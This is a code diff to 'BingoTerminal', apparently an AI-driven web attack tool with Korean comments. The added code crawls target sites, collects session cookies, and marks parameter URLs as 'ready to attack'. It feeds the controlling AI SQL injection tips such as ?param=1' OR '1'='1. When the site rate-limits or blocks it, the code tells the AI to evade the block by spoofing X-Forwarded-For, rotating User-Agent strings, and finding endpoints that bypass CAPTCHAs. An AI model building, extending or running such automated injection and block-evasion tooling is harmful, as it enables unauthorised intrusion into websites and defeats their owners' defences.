@@ -369,12 +369,83 @@ class BingoTerminal:
                 "Accept-Language": "en-US,en;q=0.9",
             }
 
-            # ── 1. 원본 URL 요청 ─────────────────────────────────────
-            resp = _hx.get(url, headers=_hdrs, follow_redirects=True, timeout=12, verify=False)
+            # ── 1. 원본 URL 요청 (세션 쿠키 자동 수집) ─────────────────
+            # follow_redirects=False 로 먼저 받아서 리다이렉트 패턴 분석
+            resp_raw = _hx.get(url, headers=_hdrs, follow_redirects=False, timeout=12, verify=False)
+            raw_status = resp_raw.status_code
+            raw_location = resp_raw.headers.get("location", "")
+            raw_cookies = dict(resp_raw.cookies)
+
+            # 세션 쿠키 추출 (JSESSIONID, PHPSESSID 등)
+            session_cookies: dict = {}
+            for ck_name in ("JSESSIONID", "PHPSESSID", "ASP.NET_SessionId", "session", "sess"):
+                if ck_name in raw_cookies:
+                    session_cookies[ck_name] = raw_cookies[ck_name]
+            # Set-Cookie 헤더에서도 추출
+            for hdr_name, hdr_val in resp_raw.headers.items():
+                if hdr_name.lower() == "set-cookie":
+                    for ck_name in ("JSESSIONID", "PHPSESSID"):
+                        if ck_name in hdr_val:
+                            import re as _re2
+                            m = _re2.search(rf"{ck_name}=([^;]+)", hdr_val)
+                            if m:
+                                session_cookies[ck_name] = m.group(1)
+
+            # 세션 쿠키 포함해서 follow_redirects=True 재요청
+            if session_cookies:
+                _hdrs_with_session = {**_hdrs, "Cookie": "; ".join(f"{k}={v}" for k, v in session_cookies.items())}
+            else:
+                _hdrs_with_session = _hdrs
+
+            resp = _hx.get(url, headers=_hdrs_with_session, follow_redirects=True, timeout=12, verify=False)
             page = resp.text
             orig_status = resp.status_code
             parsed_url = urlparse(resp.url)
             base_domain = parsed_url.scheme + "://" + parsed_url.netloc
+
+            # ── IP 차단 / 전체 307 리다이렉트 감지 ──────────────────
+            ip_block_note = ""
+            if raw_status in (307, 302, 301) and len(page) < 500:
+                # 루트도 확인해서 정말 IP 차단인지 인증 요구인지 구분
+                _root = base_domain + "/"
+                try:
+                    _root_resp = _hx.get(_root, headers=_hdrs, follow_redirects=False, timeout=8, verify=False)
+                    _root_status = _root_resp.status_code
+                    _root_location = _root_resp.headers.get("location", "")
+                except Exception:
+                    _root_status = 0
+                    _root_location = ""
+
+                if _root_status in (307, 302) and len(_root_resp.text) < 500:
+                    # 루트도 307 → IP 차단 또는 전체 인증 필요
+                    ip_block_note = (
+                        f"[!!! CRITICAL WARNING !!!]\n"
+                        f"ALL requests return {raw_status} redirect (length={len(page)}B).\n"
+                        f"Root also returns {_root_status} → {_root_location}\n"
+                        f"POSSIBLE CAUSES:\n"
+                        f"  1. IP BLOCKED/RATE LIMITED — your IP has been banned\n"
+                        f"  2. AUTHENTICATION REQUIRED — site requires login for all pages\n"
+                        f"  3. GEO BLOCK — site blocks foreign IPs\n"
+                        f"REQUIRED ACTIONS:\n"
+                        f"  - If IP blocked: wait 5-10 min, try different User-Agent or X-Forwarded-For\n"
+                        f"  - If auth required: find login endpoint, get valid session cookie first\n"
+                        f"  - Try: /login, /signin, /cms/com/login.do, /member/login.do\n"
+                        f"  - With JSESSIONID: {session_cookies if session_cookies else 'not obtained yet'}\n"
+                        f"DO NOT keep testing injection on 307 responses — oracle is always invalid on redirects.\n"
+                        f"GET A VALID SESSION FIRST, then retry injection with that session cookie."
+                    )
+                    self.console.print(
+                        f"[{THEME['error']}]  ⛔ 전체 307 감지 — IP 차단 또는 인증 필요. AI에게 세션 먼저 확보 지시.[/]"
+                    )
+                else:
+                    # 특정 URL만 307 → 인증 필요
+                    ip_block_note = (
+                        f"[AUTH REDIRECT DETECTED]\n"
+                        f"URL {url} returns {raw_status} → {raw_location}\n"
+                        f"This specific URL requires authentication.\n"
+                        f"Session cookies: {session_cookies if session_cookies else 'none'}\n"
+                        f"ACTION: Find and use a public endpoint, or get session via login form first."
+                    )
 
             # 404 감지 시 루트로 폴백 + 원래 파라미터 분석 정보 보존
             root_url = base_domain + "/"
@@ -403,12 +474,37 @@ class BingoTerminal:
                 f"=== HTTP_RESPONSE ===\n"
                 f"url: {resp.url}\n"
                 f"original_url: {url}\n"
-                f"original_status: {orig_status}\n"
+                f"raw_status_before_redirect: {raw_status}\n"
+                f"raw_redirect_location: {raw_location}\n"
                 f"status: {resp.status_code}\n"
                 f"headers: {all_headers}\n"
                 f"content_length: {len(page)}"
                 + (f"\n{orig_param_info}" if orig_param_info else "")
             )
+            # IP 차단 / 307 전체 경고
+            if ip_block_note:
+                results.append(f"=== IP_BLOCK_OR_AUTH_REQUIRED ===\n{ip_block_note}")
+            # 세션 쿠키 전달
+            if session_cookies:
+                results.append(
+                    f"=== SESSION_COOKIES (use in all requests) ===\n"
+                    + "\n".join(f"  {k}={v}" for k, v in session_cookies.items())
+                    + "\n  IMPORTANT: Include these cookies in ALL injection requests"
+                )
+            # Java/.do 사이트 감지
+            java_hints = []
+            if "jsessionid" in str(all_headers).lower() or ".do" in url or "jsessionid" in page.lower()[:1000]:
+                java_hints.append("Java/Spring/Struts detected (JSESSIONID or .do endpoints)")
+            if java_hints:
+                results.append(
+                    f"=== JAVA_TARGET_NOTES ===\n"
+                    + "\n".join(java_hints)
+                    + "\n  JAVA INJECTION TIPS:\n"
+                    + "  - Use ?param=1' OR '1'='1 for Oracle/MySQL\n"
+                    + "  - .do endpoints: menu_id, seq, idx, code params are common injection points\n"
+                    + "  - Session required: include JSESSIONID cookie in all requests\n"
+                    + "  - Follow 307 redirects with cookies to reach actual content"
+                )
 
             # ── 2. 기술 스택 힌트 (헤더 기반) ───────────────────────
             tech_hints = []
@@ -431,53 +527,139 @@ class BingoTerminal:
             if tech_hints:
                 results.append(f"=== TECH_STACK ===\n{', '.join(t for t in tech_hints if t)}")
 
-            # ── 3. 전체 링크 수집 (파라미터 유무 무관) ───────────────
+            # ── 3. 링크 수집 (정적 리소스 & 쓸모없는 파라미터 강화 필터) ──
             _STATIC_EXT = {".css",".js",".png",".jpg",".jpeg",".gif",".svg",
                            ".ico",".woff",".woff2",".ttf",".eot",".pdf",
-                           ".zip",".mp4",".webm",".map"}
-            all_links: list[str] = []
-            for href in _re.findall(r'(?:href|action|src)=["\']([^"\'<>\s]+)["\']', page, _re.I):
-                full = urljoin(str(resp.url), href)
-                if base_domain not in full:
-                    continue
-                ext = "." + full.split("?")[0].rsplit(".", 1)[-1].lower() if "." in full.split("?")[0].split("/")[-1] else ""
+                           ".zip",".mp4",".webm",".map",".scss",".less",
+                           ".xml",".json",".txt",".csv"}
+            # 버전/정적 파라미터 패턴 (ver=, v=, _=, t= 만 있는 URL은 제외)
+            _STATIC_PARAM_RE = _re.compile(
+                r"[?&](ver|version|v|_|t|ts|timestamp|rev|cache|cb)=[\w.\-]+$", _re.I
+            )
+            # CDN/외부 도메인 필터
+            _CDN_DOMAINS = ("maxst.icons8", "cdnjs.", "fonts.google", "jquery.com",
+                            "bootstrap", "googleapis.com", "gstatic.com", "cloudflare.com")
+
+            def _is_useful_link(href: str, full: str) -> bool:
+                # 외부 CDN 제외
+                if any(cdn in full for cdn in _CDN_DOMAINS):
+                    return False
+                # 같은 도메인만 (서브도메인은 허용)
+                parsed_full = urlparse(full)
+                parsed_base = urlparse(base_domain)
+                if parsed_full.netloc and parsed_base.netloc not in parsed_full.netloc and parsed_full.netloc not in parsed_base.netloc:
+                    # 서브도메인 관계인지 확인
+                    base_parts = parsed_base.netloc.split(".")
+                    full_parts = parsed_full.netloc.split(".")
+                    if base_parts[-2:] != full_parts[-2:]:  # 다른 도메인
+                        return False
+                # 정적 파일 확장자 제외
+                path_only = full.split("?")[0]
+                ext = "." + path_only.rsplit(".", 1)[-1].lower() if "." in path_only.split("/")[-1] else ""
                 if ext in _STATIC_EXT:
+                    return False
+                # 버전 파라미터만 있는 링크 제외 (ver=3.3 같은것)
+                if "?" in full and _STATIC_PARAM_RE.search(full.split("?", 1)[1]):
+                    # 파라미터가 오직 버전용만인지 확인
+                    qstr = full.split("?", 1)[1]
+                    params = [p.split("=")[0] for p in qstr.split("&")]
+                    static_params = {"ver","version","v","_","t","ts","timestamp","rev","cache","cb"}
+                    if all(p.lower() in static_params for p in params):
+                        return False
+                return True
+
+            all_links: list[str] = []
+            for href in _re.findall(r'(?:href|action|src|data-url|data-href)=["\']([^"\'<>\s]+)["\']', page, _re.I):
+                if href.startswith(("javascript:", "mailto:", "tel:", "#", "void")):
                     continue
-                all_links.append(full)
-            all_links = list(dict.fromkeys(all_links))[:40]
+                full = urljoin(str(resp.url), href)
+                if _is_useful_link(href, full):
+                    all_links.append(full)
+
+            # JS 내부 경로 힌트 추출 (fetch('/api/...'), url: '/path')
+            js_paths = _re.findall(r'["\'](\/([\w\-/]+\.do|api\/[\w\-/]+|[\w\-/]+\/(?:list|detail|view|search|index)[^\s"\']*?))["\']', page, _re.I)
+            for jp, _ in js_paths[:20]:
+                full = base_domain + jp
+                if full not in all_links:
+                    all_links.append(full)
+
+            all_links = list(dict.fromkeys(all_links))
 
             param_links_raw = [l for l in all_links if "?" in l and "=" in l]
             no_param_links = [l for l in all_links if "?" not in l]
 
-            # ── 파라미터 URL 상태코드 검증 (404는 제외, AI가 존재하는 페이지만 공격) ──
+            # ── 3-1. Java .do 사이트: 세션 포함해서 2단계 깊은 크롤링 ──
+            deep_links: list[str] = []
+            _hdrs_sess = {**_hdrs_with_session}
+            # .do 링크가 있거나 Java 감지된 경우
+            _is_java = any(".do" in l for l in all_links) or bool(session_cookies)
+            if _is_java and no_param_links:
+                _visited = set()
+                for _link in no_param_links[:8]:  # 최대 8개 페이지 방문
+                    if _link in _visited:
+                        continue
+                    _visited.add(_link)
+                    try:
+                        _dr = _hx.get(_link, headers=_hdrs_sess, follow_redirects=True, timeout=6, verify=False)
+                        if _dr.status_code == 200 and len(_dr.text) > 500:
+                            for _dh in _re.findall(r'(?:href|action)=["\']([^"\'<>\s]+)["\']', _dr.text, _re.I):
+                                if _dh.startswith(("javascript:", "mailto:", "tel:", "#")):
+                                    continue
+                                _df = urljoin(_link, _dh)
+                                if _is_useful_link(_dh, _df) and _df not in all_links:
+                                    deep_links.append(_df)
+                    except Exception:
+                        pass
+                deep_links = list(dict.fromkeys(deep_links))
+                # 깊은 크롤링에서 발견한 파라미터 URL 추가
+                for dl in deep_links:
+                    if dl not in all_links:
+                        all_links.append(dl)
+                        if "?" in dl and "=" in dl:
+                            param_links_raw.append(dl)
+
+            all_links = list(dict.fromkeys(all_links))[:60]
+            param_links_raw = list(dict.fromkeys(param_links_raw))
+
+            # ── 파라미터 URL 상태코드 검증 (세션 포함, 404는 제외) ───────
             param_links_verified: list[tuple[str, int]] = []
             param_links_404: list[str] = []
-            for pl in param_links_raw[:15]:
+            param_links_redirect: list[tuple[str, int]] = []
+            for pl in param_links_raw[:20]:
                 try:
-                    _vr = _hx.get(pl, headers=_hdrs, follow_redirects=True, timeout=5, verify=False)
-                    if _vr.status_code == 404:
+                    _vr = _hx.get(pl, headers=_hdrs_sess, follow_redirects=True, timeout=5, verify=False)
+                    sc = _vr.status_code
+                    if sc == 404:
                         param_links_404.append(pl)
+                    elif sc in (301, 302, 307, 308):
+                        param_links_redirect.append((pl, sc))
                     else:
-                        param_links_verified.append((pl, _vr.status_code))
+                        param_links_verified.append((pl, sc))
                 except Exception:
                     pass
 
             results.append(
-                f"=== ALL_LINKS ({len(all_links)} total) ===\n"
-                + "\n".join(f"  {l}" for l in all_links[:30])
+                f"=== ALL_LINKS ({len(all_links)} total, {len(deep_links)} from deep crawl) ===\n"
+                + "\n".join(f"  {l}" for l in all_links[:40])
             )
             if param_links_verified:
                 results.append(
-                    f"=== PARAM_URLS_VERIFIED ({len(param_links_verified)}) — 200 OK only, ready to attack ===\n"
+                    f"=== PARAM_URLS_VERIFIED ({len(param_links_verified)}) — ready to attack ===\n"
                     + "\n".join(f"  [{status}] {l}" for l, status in param_links_verified)
+                )
+            if param_links_redirect:
+                results.append(
+                    f"=== PARAM_URLS_REDIRECT ({len(param_links_redirect)}) — need session cookie ===\n"
+                    + "\n".join(f"  [{status}] {l}" for l, status in param_links_redirect)
+                    + "\n  TIP: Use session cookies to access these"
                 )
             if param_links_404:
                 results.append(
-                    f"=== PARAM_URLS_404 ({len(param_links_404)}) — DO NOT ATTACK, these return 404 ===\n"
+                    f"=== PARAM_URLS_404 ({len(param_links_404)}) — DO NOT ATTACK ===\n"
                     + "\n".join(f"  {l}" for l in param_links_404)
                 )
-            # 하위 호환용 (AI 코드에서 param_links 참조 시 사용)
-            param_links = [l for l, _ in param_links_verified]
+            # 하위 호환용
+            param_links = [l for l, _ in param_links_verified] + [l for l, _ in param_links_redirect]
 
             # ── 4. HTML 폼 전체 수집 ─────────────────────────────────
             forms_raw = _re.findall(
@@ -1675,9 +1857,54 @@ class BingoTerminal:
             # 루프마다 세션 자동 저장 (이어하기용)
             self._save_history()
 
+            # ── IP 차단 / Rate Limit 자동 감지 및 대기 ────────────────────
+            _ip_block_hint = ""
+            _raw_lower = raw_results.lower()
+            _ip_block_signals = [
+                ("429", "Rate limit (429) detected"),
+                ("too many requests", "Too Many Requests"),
+                ("rate limit", "Rate limit hit"),
+                ("403 forbidden", "403 Forbidden — possible IP block"),
+                ("503 service", "503 Service Unavailable"),
+                ("connection refused", "Connection refused"),
+                ("connection reset", "Connection reset"),
+                ("timed out", "Request timeout"),
+                ("blocked", "Block detected"),
+                ("captcha", "CAPTCHA detected"),
+                ("banned", "Possible IP ban"),
+                ("access denied", "Access denied"),
+                ("temporarily unavailable", "Temporarily unavailable"),
+            ]
+            _detected_blocks = [label for sig, label in _ip_block_signals if sig in _raw_lower]
+
+            if _detected_blocks:
+                _wait_secs = 15
+                _lang = getattr(self.config, "lang", "en")
+                _block_msg = {
+                    "ko": f"⛔ 차단 감지: {', '.join(_detected_blocks)} — {_wait_secs}초 대기 후 재시도...",
+                    "zh": f"⛔ 检测到封锁: {', '.join(_detected_blocks)} — 等待 {_wait_secs} 秒后重试...",
+                    "en": f"⛔ Block detected: {', '.join(_detected_blocks)} — waiting {_wait_secs}s before retry...",
+                }.get(_lang, f"⛔ Block detected — waiting {_wait_secs}s...")
+                self.console.print(f"[{THEME['warn']}]{_block_msg}[/]")
+                import time as _time
+                # 대기 중 카운트다운 표시
+                for _i in range(_wait_secs, 0, -5):
+                    _time.sleep(min(5, _i))
+                    self.console.print(f"[{THEME['muted']}]  ⏱ {_i}s 남음...[/]")
+                _ip_block_hint = (
+                    f"\n[IP_BLOCK_DETECTED: {', '.join(_detected_blocks)}]\n"
+                    f"Waited {_wait_secs}s. Now retry with:\n"
+                    f"  - Different User-Agent string\n"
+                    f"  - X-Forwarded-For: 8.8.8.8 header\n"
+                    f"  - Reduce request rate (add time.sleep(2) between requests)\n"
+                    f"  - Try a different endpoint or parameter\n"
+                    f"  - If CAPTCHA: look for API endpoint that bypasses frontend\n"
+                )
+
             injection = (
                 "=== BINGO REAL EXECUTION RESULTS ===\n"
                 + trimmed
+                + _ip_block_hint
                 + "\n=== END REAL RESULTS ===\n\n"
                 + state_summary
                 + "NEXT ACTION: Continue from where you left off. "
